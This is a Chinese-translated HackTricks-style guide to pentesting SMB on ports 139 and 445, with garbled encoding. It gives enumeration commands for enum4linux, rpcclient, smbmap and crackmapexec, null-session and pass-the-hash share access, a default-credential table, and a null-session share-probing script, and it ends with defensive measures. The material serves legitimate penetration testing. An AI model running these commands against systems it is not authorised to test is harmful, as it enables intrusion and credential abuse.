# 139,445 - SMB æ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## **ç«¯å£ 139**

**NetBIOS** ä»£è¡¨ _ç½‘ç»œåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿ_ã€‚å®ƒæ˜¯ä¸€ç§è½¯ä»¶åè®®ï¼Œå…è®¸å±€åŸŸç½‘ï¼ˆLANï¼‰ä¸Šçš„åº”ç”¨ç¨‹åºã€ä¸ªäººç”µè„‘å’Œæ¡Œé¢ç”µè„‘ä¸ç½‘ç»œç¡¬ä»¶è¿›è¡Œé€šä¿¡ï¼Œå¹¶åœ¨ç½‘ç»œä¸Šä¼ è¾“æ•°æ®ã€‚åœ¨ NetBIOS ç½‘ç»œä¸Šè¿è¡Œçš„è½¯ä»¶åº”ç”¨ç¨‹åºé€šè¿‡å®ƒä»¬çš„ NetBIOS åç§°å®šä½å’Œè¯†åˆ«å½¼æ­¤ã€‚NetBIOS åç§°æœ€é•¿å¯è¾¾ 16 ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”é€šå¸¸ä¸è®¡ç®—æœºåç§°åˆ†å¼€ã€‚å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆå®¢æˆ·ç«¯ï¼‰é€šè¿‡ **TCP ç«¯å£ 139** å‘é€å‘½ä»¤â€œå‘¼å«â€å¦ä¸€ä¸ªå®¢æˆ·ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰æ—¶ï¼Œä¸¤ä¸ªåº”ç”¨ç¨‹åºä¼šå¯åŠ¨ä¸€ä¸ª NetBIOS ä¼šè¯ã€‚ï¼ˆæ‘˜è‡ª[è¿™é‡Œ](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ï¼‰
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## ç«¯å£445

è™½ç„¶ç«¯å£139åœ¨æŠ€æœ¯ä¸Šè¢«ç§°ä¸ºâ€œNBT over IPâ€ï¼Œä½†ç«¯å£445æ˜¯â€œSMB over IPâ€ã€‚**SMB**ä»£è¡¨â€œ**Server Message Blocks**â€ã€‚ç°ä»£è¯­è¨€ä¸­ï¼ŒServer Message Blockä¹Ÿè¢«ç§°ä¸º**Common Internet File System**ã€‚è¯¥ç³»ç»Ÿä½œä¸ºåº”ç”¨å±‚ç½‘ç»œåè®®ä¸»è¦ç”¨äºåœ¨ç½‘ç»œä¸Šçš„èŠ‚ç‚¹ä¹‹é—´æä¾›æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£å’Œå…¶ä»–é€šä¿¡æ–¹å¼çš„å…±äº«è®¿é—®ã€‚

ä¾‹å¦‚ï¼Œåœ¨Windowsä¸Šï¼ŒSMBå¯ä»¥ç›´æ¥åœ¨TCP/IPä¸Šè¿è¡Œï¼Œè€Œæ— éœ€NetBIOS over TCP/IPã€‚æ­£å¦‚ä½ æ‰€æŒ‡å‡ºçš„ï¼Œè¿™å°†ä½¿ç”¨ç«¯å£445ã€‚åœ¨å…¶ä»–ç³»ç»Ÿä¸Šï¼Œä½ ä¼šå‘ç°æœåŠ¡å’Œåº”ç”¨ç¨‹åºä½¿ç”¨ç«¯å£139ã€‚è¿™æ„å‘³ç€SMBæ­£åœ¨ä½¿ç”¨NetBIOS over TCP/IPã€‚ï¼ˆæ‘˜è‡ª[è¿™é‡Œ](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ï¼‰
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

Server Message Block (`SMB`) æ˜¯ä¸€ç§**å®¢æˆ·ç«¯-æœåŠ¡å™¨**åè®®ï¼Œç”¨äºç®¡ç†å¯¹æ–‡ä»¶ã€æ•´ä¸ªç›®å½•å’Œå…¶ä»–ç½‘ç»œèµ„æºï¼ˆå¦‚æ‰“å°æœºã€è·¯ç”±å™¨æˆ–ç½‘ç»œæ¥å£ï¼‰çš„è®¿é—®ã€‚è¯¥åè®®çš„ä¸»è¦åº”ç”¨é¢†åŸŸæ˜¯ç‰¹å®šçš„Windowsæ“ä½œç³»ç»Ÿç³»åˆ—ï¼Œå…¶ç½‘ç»œæœåŠ¡ä»¥å‘ä¸‹å…¼å®¹çš„æ–¹å¼æ”¯æŒSMB - è¿™æ„å‘³ç€å…·æœ‰è¾ƒæ–°ç‰ˆæœ¬çš„è®¾å¤‡å¯ä»¥è½»æ¾ä¸å®‰è£…æœ‰è¾ƒæ—§Microsoftæ“ä½œç³»ç»Ÿçš„è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚\
é€šè¿‡å…è´¹è½¯ä»¶é¡¹ç›®**Samba**ï¼Œè¿˜å¯ä»¥åœ¨Linuxå’ŒUnixå‘è¡Œç‰ˆä¸­ä½¿ç”¨SMBï¼Œä»è€Œå®ç°è·¨å¹³å°çš„SMBé€šä¿¡ã€‚

SMBæœåŠ¡å™¨å¯ä»¥å°†å…¶æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„**ä»»æ„éƒ¨åˆ†ä½œä¸ºå…±äº«**æä¾›ã€‚å› æ­¤ï¼Œå¯¹å®¢æˆ·ç«¯å¯è§çš„**å±‚æ¬¡ç»“æ„**éƒ¨åˆ†ä¸Šç‹¬ç«‹äºæœåŠ¡å™¨ä¸Šçš„**ç»“æ„**ã€‚**è®¿é—®æƒé™**ç”±`è®¿é—®æ§åˆ¶åˆ—è¡¨`ï¼ˆ`ACL`ï¼‰å®šä¹‰ã€‚å®ƒä»¬å¯ä»¥æ ¹æ®**`æ‰§è¡Œ`**ã€**`è¯»å–`**å’Œ**`å®Œå…¨è®¿é—®`**ç­‰å±æ€§ä»¥**ç»†ç²’åº¦çš„æ–¹å¼**å¯¹ä¸ªåˆ«ç”¨æˆ·æˆ–ç”¨æˆ·ç»„è¿›è¡Œæ§åˆ¶ã€‚**ACL**æ˜¯åŸºäºå…±äº«å®šä¹‰çš„ï¼Œå› æ­¤ä¸åœ¨æœåŠ¡å™¨ä¸Šæœ¬åœ°åˆ†é…çš„æƒé™ä¸å¯¹åº”ã€‚

### IPC$ å…±äº«

æ¥è‡ªä¹¦ç± _**Network Security Assessment 3rd edition**_

é€šè¿‡åŒ¿åç©ºä¼šè¯ï¼Œæ‚¨å¯ä»¥è®¿é—®IPC$å…±äº«å¹¶ä¸é€šè¿‡å‘½åç®¡é“å…¬å¼€çš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚Kali Linuxä¸­çš„enum4linuxå®ç”¨ç¨‹åºéå¸¸æœ‰ç”¨ï¼›ä½¿ç”¨å®ƒï¼Œæ‚¨å¯ä»¥è·å–ä»¥ä¸‹ä¿¡æ¯ï¼š

* æ“ä½œç³»ç»Ÿä¿¡æ¯
* çˆ¶åŸŸçš„è¯¦ç»†ä¿¡æ¯
* æœ¬åœ°ç”¨æˆ·å’Œç»„åˆ—è¡¨
* å¯ç”¨SMBå…±äº«çš„è¯¦ç»†ä¿¡æ¯
* æœ‰æ•ˆçš„ç³»ç»Ÿå®‰å…¨ç­–ç•¥

## ä»€ä¹ˆæ˜¯NTLM

å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯NTLMï¼Œæˆ–è€…æƒ³äº†è§£å®ƒæ˜¯å¦‚ä½•å·¥ä½œå’Œå¦‚ä½•æ»¥ç”¨å®ƒï¼Œæ‚¨ä¼šå‘ç°è¿™ä¸ªå…³äº**NTLM**çš„é¡µé¢éå¸¸æœ‰è¶£ï¼Œå…¶ä¸­è§£é‡Šäº†**è¯¥åè®®çš„å·¥ä½œåŸç†ä»¥åŠæ‚¨å¦‚ä½•åˆ©ç”¨å®ƒï¼š**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **æœåŠ¡å™¨æšä¸¾**

### **æ‰«æ**ç½‘ç»œä»¥æœç´¢ä¸»æœºï¼š
```bash
nbtscan -r 192.168.0.1/24
```
### SMBæœåŠ¡å™¨ç‰ˆæœ¬

è¦å¯»æ‰¾å¯èƒ½çš„SMBç‰ˆæœ¬æ¼æ´ï¼Œäº†è§£æ­£åœ¨ä½¿ç”¨çš„ç‰ˆæœ¬éå¸¸é‡è¦ã€‚å¦‚æœè¿™äº›ä¿¡æ¯åœ¨å…¶ä»–ä½¿ç”¨çš„å·¥å…·ä¸­æ²¡æœ‰æ˜¾ç¤ºï¼Œæ‚¨å¯ä»¥ï¼š

* ä½¿ç”¨**MSF**è¾…åŠ©æ¨¡å—\_**auxiliary/scanner/smb/smb\_version**
* æˆ–è€…ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼š
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **æœç´¢æ¼æ´**

To search for exploits, you can use various tools and resources. Here are some common methods:

- **Exploit Databases**: Websites like Exploit-DB, Rapid7, and Metasploit provide extensive databases of known exploits. You can search these databases using relevant keywords or specific vulnerabilities.

- **Vulnerability Scanners**: Tools like Nessus, OpenVAS, and Nexpose can scan networks and systems for known vulnerabilities and provide a list of potential exploits.

- **Security Blogs and Forums**: Many security researchers and experts share their findings and exploits on blogs and forums. Keeping an eye on these platforms can help you discover new exploits.

- **Exploit Frameworks**: Frameworks like Metasploit and Core Impact offer a wide range of exploits that you can search and utilize for penetration testing.

Remember, when searching for exploits, it's important to ensure that you have proper authorization and are using them for legitimate purposes.
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **å¯èƒ½çš„**å‡­æ®

| **ç”¨æˆ·å**           | **å¸¸è§å¯†ç **                              |
| -------------------- | ----------------------------------------- |
| _(ç©ºç™½)_             | _(ç©ºç™½)_                                 |
| guest                | _(ç©ºç™½)_                                 |
| Administrator, admin | _(ç©ºç™½)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### SMBç¯å¢ƒä¿¡æ¯

### è·å–ä¿¡æ¯
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### æšä¸¾ç”¨æˆ·ã€ç»„å’Œå·²ç™»å½•ç”¨æˆ·

#### SMBæšä¸¾ç”¨æˆ·

ä½¿ç”¨`enum4linux`å·¥å…·å¯ä»¥æšä¸¾SMBæœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·åˆ—è¡¨ã€‚è¯¥å·¥å…·å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š

```bash
apt-get install enum4linux
```

ç„¶åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æšä¸¾ç”¨æˆ·ï¼š

```bash
enum4linux -U <target_IP>
```

#### SMBæšä¸¾ç»„

ä½¿ç”¨`enum4linux`å·¥å…·å¯ä»¥æšä¸¾SMBæœåŠ¡å™¨ä¸Šçš„ç»„åˆ—è¡¨ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œç»„æšä¸¾ï¼š

```bash
enum4linux -G <target_IP>
```

#### SMBæšä¸¾å·²ç™»å½•ç”¨æˆ·

ä½¿ç”¨`enum4linux`å·¥å…·å¯ä»¥æšä¸¾SMBæœåŠ¡å™¨ä¸Šçš„å·²ç™»å½•ç”¨æˆ·åˆ—è¡¨ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œå·²ç™»å½•ç”¨æˆ·æšä¸¾ï¼š

```bash
enum4linux -u <target_IP>
```

#### ä½¿ç”¨Metasploitæšä¸¾ç”¨æˆ·å’Œç»„

Metasploitæ¡†æ¶æä¾›äº†ä¸€äº›æ¨¡å—ï¼Œå¯ä»¥ç”¨äºæšä¸¾SMBæœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·å’Œç»„ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨Metasploitæ§åˆ¶å°ï¼š

```bash
msfconsole
```

ç„¶åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æšä¸¾ç”¨æˆ·ï¼š

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <target_IP>
run
```

è¦æšä¸¾ç»„ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
use auxiliary/scanner/smb/smb_enumgroups
set RHOSTS <target_IP>
run
```

#### ä½¿ç”¨Nmapæšä¸¾å·²ç™»å½•ç”¨æˆ·

Nmapæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œæ‰«æå·¥å…·ï¼Œå¯ä»¥ç”¨äºæšä¸¾SMBæœåŠ¡å™¨ä¸Šçš„å·²ç™»å½•ç”¨æˆ·ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œå·²ç™»å½•ç”¨æˆ·æšä¸¾ï¼š

```bash
nmap -p 445 --script smb-enum-users <target_IP>
```

è¯·æ³¨æ„ï¼Œè¿™äº›æšä¸¾æ–¹æ³•å¯èƒ½ä¼šåœ¨ä¸åŒçš„ç¯å¢ƒä¸­äº§ç”Ÿä¸åŒçš„ç»“æœã€‚å› æ­¤ï¼Œå»ºè®®å°è¯•å¤šç§æ–¹æ³•ä»¥è·å–æ›´å…¨é¢çš„ä¿¡æ¯ã€‚
```bash
# This info should already being gathered from enum4linux and enum4linux-ng
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups

# Impacket - Enumerate local users
lookupsid.py -no-pass hostname.local

# Metasploit - Enumerate local users
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **æšä¸¾LSARPCå’ŒSAMR rpcclient**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### ä»Linuxè¿›è¡ŒGUIè¿æ¥

#### åœ¨ç»ˆç«¯ä¸­ï¼š

`xdg-open smb://cascade.htb/`

#### åœ¨æ–‡ä»¶æµè§ˆå™¨çª—å£ä¸­ï¼ˆnautilusï¼Œthunarç­‰ï¼‰

`smb://friendzone.htb/general/`

## å…±äº«æ–‡ä»¶å¤¹æšä¸¾

### åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹

é€šå¸¸å»ºè®®æŸ¥çœ‹æ˜¯å¦å¯ä»¥è®¿é—®ä»»ä½•å†…å®¹ï¼Œå¦‚æœæ²¡æœ‰å‡­æ®ï¼Œè¯·å°è¯•ä½¿ç”¨**null** **å‡­æ®/è®¿å®¢ç”¨æˆ·**ã€‚
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **è¿æ¥/åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹**

To connect to a shared folder on a remote machine, you can use the `smbclient` tool. This tool allows you to interact with SMB (Server Message Block) servers and perform various operations.

To connect to a shared folder, use the following command:

```
smbclient //<IP_ADDRESS>/<SHARED_FOLDER_NAME> -U <USERNAME>
```

Replace `<IP_ADDRESS>` with the IP address of the remote machine and `<SHARED_FOLDER_NAME>` with the name of the shared folder you want to connect to. Additionally, replace `<USERNAME>` with a valid username that has access to the shared folder.

Once connected, you can use various commands to interact with the shared folder. For example, you can use the `ls` command to list the files and directories in the shared folder:

```
ls
```

This will display the contents of the shared folder.

You can also use the `get` command to download a file from the shared folder to your local machine:

```
get <FILE_NAME>
```

Replace `<FILE_NAME>` with the name of the file you want to download.

To exit the `smbclient` tool, use the `exit` command:

```
exit
```

This will disconnect you from the shared folder.
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **æ‰‹åŠ¨æšä¸¾Windowså…±äº«å¹¶è¿æ¥åˆ°å®ƒä»¬**

å¯èƒ½æ‚¨è¢«é™åˆ¶æ˜¾ç¤ºä¸»æœºæœºå™¨çš„ä»»ä½•å…±äº«ï¼Œå½“æ‚¨å°è¯•åˆ—å‡ºå®ƒä»¬æ—¶ï¼Œä¼¼ä¹æ²¡æœ‰ä»»ä½•å…±äº«å¯è¿æ¥ã€‚å› æ­¤ï¼Œå€¼å¾—å°è¯•æ‰‹åŠ¨è¿æ¥åˆ°å…±äº«ã€‚è¦æ‰‹åŠ¨æšä¸¾å…±äº«ï¼Œæ‚¨å¯èƒ½å¸Œæœ›æŸ¥æ‰¾ç±»ä¼¼äºNT\_STATUS\_ACCESS\_DENIEDå’ŒNT\_STATUS\_BAD\_NETWORK\_NAMEçš„å“åº”ï¼Œå½“ä½¿ç”¨æœ‰æ•ˆä¼šè¯ï¼ˆä¾‹å¦‚ç©ºä¼šè¯æˆ–æœ‰æ•ˆå‡­æ®ï¼‰æ—¶ã€‚è¿™äº›å¯èƒ½è¡¨æ˜å…±äº«æ˜¯å¦å­˜åœ¨ä¸”æ‚¨æ— æƒè®¿é—®å®ƒï¼Œæˆ–è€…å…±äº«æ ¹æœ¬ä¸å­˜åœ¨ã€‚

Windowsç›®æ ‡çš„å¸¸è§å…±äº«åç§°åŒ…æ‹¬ï¼š

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

ï¼ˆæ¥è‡ªã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ç¬¬ä¸‰ç‰ˆã€‹çš„å¸¸è§å…±äº«åç§°ï¼‰

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿æ¥åˆ°å®ƒä»¬ï¼š
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
æˆ–è€…ä½¿ç”¨è¿™ä¸ªè„šæœ¬ï¼ˆä½¿ç”¨ç©ºä¼šè¯ï¼‰
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
### SMB (Server Message Block)

SMBï¼ˆServer Message Blockï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨è®¡ç®—æœºç½‘ç»œä¸Šå…±äº«æ–‡ä»¶ã€æ‰“å°æœºå’Œå…¶ä»–èµ„æºçš„é€šä¿¡åè®®ã€‚å®ƒæ˜¯ä¸€ç§å®¢æˆ·ç«¯-æœåŠ¡å™¨åè®®ï¼Œå…è®¸å®¢æˆ·ç«¯è¯·æ±‚æ–‡ä»¶æˆ–å…¶ä»–æœåŠ¡ï¼Œå¹¶ç”±æœåŠ¡å™¨æä¾›å“åº”ã€‚

#### SMBç‰ˆæœ¬

- **SMBv1**ï¼šæœ€æ—©çš„SMBç‰ˆæœ¬ï¼Œå­˜åœ¨è®¸å¤šå®‰å…¨æ¼æ´ï¼Œå› æ­¤ä¸æ¨èä½¿ç”¨ã€‚
- **SMBv2**ï¼šå¼•å…¥äº†æ›´å¼ºå¤§çš„åŠ å¯†å’Œèº«ä»½éªŒè¯æœºåˆ¶ï¼Œæ˜¯Windows Vistaå’ŒWindows Server 2008çš„é»˜è®¤ç‰ˆæœ¬ã€‚
- **SMBv3**ï¼šè¿›ä¸€æ­¥å¢å¼ºäº†å®‰å…¨æ€§å’Œæ€§èƒ½ï¼Œæ˜¯Windows 8å’ŒWindows Server 2012çš„é»˜è®¤ç‰ˆæœ¬ã€‚

#### SMBçš„æ¸—é€æµ‹è¯•

SMBçš„æ¸—é€æµ‹è¯•ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1. **ç«¯å£æ‰«æ**ï¼šä½¿ç”¨å·¥å…·å¦‚Nmapæ‰«æç›®æ ‡ä¸»æœºçš„445ç«¯å£ï¼Œä»¥ç¡®å®šæ˜¯å¦å¼€æ”¾äº†SMBæœåŠ¡ã€‚
2. **æšä¸¾**ï¼šä½¿ç”¨å·¥å…·å¦‚enum4linuxã€smbmapå’Œsmbclientæ¥æšä¸¾ç›®æ ‡ä¸»æœºä¸Šçš„å…±äº«æ–‡ä»¶å¤¹ã€ç”¨æˆ·å’Œç»„ä¿¡æ¯ã€‚
3. **å¼±å£ä»¤æ”»å‡»**ï¼šä½¿ç”¨å·¥å…·å¦‚Hydraã€Medusaå’ŒCrackMapExecæ¥å°è¯•çŒœè§£SMBæœåŠ¡çš„ç”¨æˆ·åå’Œå¯†ç ã€‚
4. **SMBå…±äº«æ–‡ä»¶å¤¹è®¿é—®**ï¼šä½¿ç”¨å·¥å…·å¦‚smbclientã€smbgetå’Œsmbmountæ¥è®¿é—®ç›®æ ‡ä¸»æœºä¸Šçš„å…±äº«æ–‡ä»¶å¤¹ï¼Œå¹¶è·å–æ•æ„Ÿä¿¡æ¯ã€‚
5. **SMBæ¼æ´åˆ©ç”¨**ï¼šåˆ©ç”¨å·²çŸ¥çš„SMBæ¼æ´ï¼Œå¦‚EternalBlueå’ŒSMBGhostï¼Œæ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚

#### SMBçš„å¸¸è§æ¼æ´

- **SMBå¼±å£ä»¤**ï¼šä½¿ç”¨å¼±å¯†ç ä¿æŠ¤SMBæœåŠ¡ï¼Œå®¹æ˜“å—åˆ°æš´åŠ›ç ´è§£æ”»å‡»ã€‚
- **SMBå…±äº«æ–‡ä»¶å¤¹æƒé™é…ç½®ä¸å½“**ï¼šé”™è¯¯é…ç½®å…±äº«æ–‡ä»¶å¤¹çš„æƒé™ï¼Œå¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚
- **SMBç‰ˆæœ¬æ¼æ´**ï¼šæ—§ç‰ˆæœ¬çš„SMBå­˜åœ¨å¤šä¸ªå·²çŸ¥æ¼æ´ï¼Œå¦‚EternalBlueå’ŒSMBGhostï¼Œå¯è¢«é»‘å®¢åˆ©ç”¨è¿›è¡Œæ”»å‡»ã€‚

#### SMBçš„é˜²å¾¡æªæ–½

- **æ›´æ–°SMBç‰ˆæœ¬**ï¼šä½¿ç”¨æœ€æ–°çš„SMBç‰ˆæœ¬ï¼Œä»¥ç¡®ä¿å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚
- **å¼ºå¯†ç ç­–ç•¥**ï¼šä½¿ç”¨å¼ºå¯†ç ä¿æŠ¤SMBæœåŠ¡ï¼Œé¿å…ä½¿ç”¨å¸¸è§å¯†ç ã€‚
- **æ­£ç¡®é…ç½®å…±äº«æ–‡ä»¶å¤¹æƒé™**ï¼šä»…æˆæƒåˆé€‚çš„ç”¨æˆ·å’Œç»„è®¿é—®å…±äº«æ–‡ä»¶å¤¹ã€‚
- **å®‰å…¨è¡¥ä¸å’Œæ›´æ–°**ï¼šåŠæ—¶å®‰è£…æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„å®‰å…¨è¡¥ä¸å’Œæ›´æ–°ï¼Œä»¥ä¿®å¤å·²çŸ¥çš„SMBæ¼æ´ã€‚
- **ç½‘ç»œéš”ç¦»**ï¼šå°†SMBæœåŠ¡éš”ç¦»åœ¨å®‰å…¨çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œé™åˆ¶å¯¹å…¶çš„è®¿é—®ã€‚

#### SMBçš„æœ‰ç”¨å·¥å…·

- **enum4linux**ï¼šç”¨äºæšä¸¾SMBæœåŠ¡çš„å·¥å…·ï¼Œå¯è·å–å…±äº«æ–‡ä»¶å¤¹ã€ç”¨æˆ·å’Œç»„ä¿¡æ¯ã€‚
- **smbmap**ï¼šç”¨äºæšä¸¾SMBå…±äº«æ–‡ä»¶å¤¹çš„å·¥å…·ï¼Œå¯æ£€æŸ¥å…±äº«æ–‡ä»¶å¤¹çš„æƒé™å’Œå†…å®¹ã€‚
